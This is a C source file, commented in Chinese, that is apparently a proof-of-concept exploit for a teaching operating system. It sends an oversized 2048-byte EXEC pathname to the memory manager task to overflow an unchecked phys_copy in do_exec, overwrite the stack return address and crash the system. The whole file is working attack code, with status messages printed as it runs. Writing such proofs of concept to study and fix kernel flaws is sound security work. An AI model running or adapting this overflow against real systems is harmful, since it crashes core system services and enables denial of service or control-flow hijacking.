#include "type.h"
#include "stdio.h"
#include "const.h"
#include "string.h"
#include "proto.h"

/**
 * POC: MM 系统任务栈缓冲区溢出攻击
 * 
 * 目标：利用 do_exec 函数中缺乏边界检查的 phys_copy，
 *       覆盖 MM 任务的栈帧（Stack Frame）。
 * 
 * 结果：MM 任务崩溃，导致系统死锁或重启。
 */
void poc_mm_stack_overflow() {
    MESSAGE msg;
    
    // 构造一个远大于 MAX_PATH (128) 的 Payload
    // MM 的栈大小通常只有 16KB，发送过大的数据甚至可能覆盖其他内核数据
    char malicious_payload[2048]; 
    
    // 用 'A' (0x41) 填充，方便在 Bochs 调试器中观察 EIP 是否变成 0x41414141
    memset(malicious_payload, 'A', sizeof(malicious_payload));
    // 确保字符串以 null 结尾（虽然 phys_copy 不在乎，但为了安全起见）
    malicious_payload[sizeof(malicious_payload) - 1] = '\0';

    printf("\n");
    printf("###########################################################\n");
    printf("#  POC: Kernel/System Task Stack Buffer Overflow Attack   #\n");
    printf("###########################################################\n");
    printf("[*] Target: TASK_MM (Memory Manager)\n");
    printf("[*] Vulnerability: Unchecked buffer copy in do_exec()\n");
    printf("[*] Payload Size: %d bytes (MAX_PATH is usually 128)\n", sizeof(malicious_payload));

    // 构造恶意的 EXEC 消息
    msg.type = EXEC;
    msg.NAME_LEN = sizeof(malicious_payload); // 告诉 MM 我们要拷贝 2048 字节
    msg.PATHNAME = malicious_payload;         // 指向我们的恶意数据
    msg.BUF_LEN = 0;                          // 参数长度为 0

    printf("[*] Sending malicious EXEC message to MM...\n");
    
    // 发送消息
    // 这会触发 MM 执行 do_exec，进而执行 phys_copy
    // MM 的栈将被 'A' 覆盖，包括函数的返回地址 (Return Address)
    send_recv(BOTH, TASK_MM, &msg);

    // 如果代码能运行到这里，说明攻击失败（或者 MM 还没崩溃）
    printf("[!] Attack sent. If system is still running, the exploit failed.\n");
}

void main() {
    poc_mm_stack_overflow();
    while(1) {}
}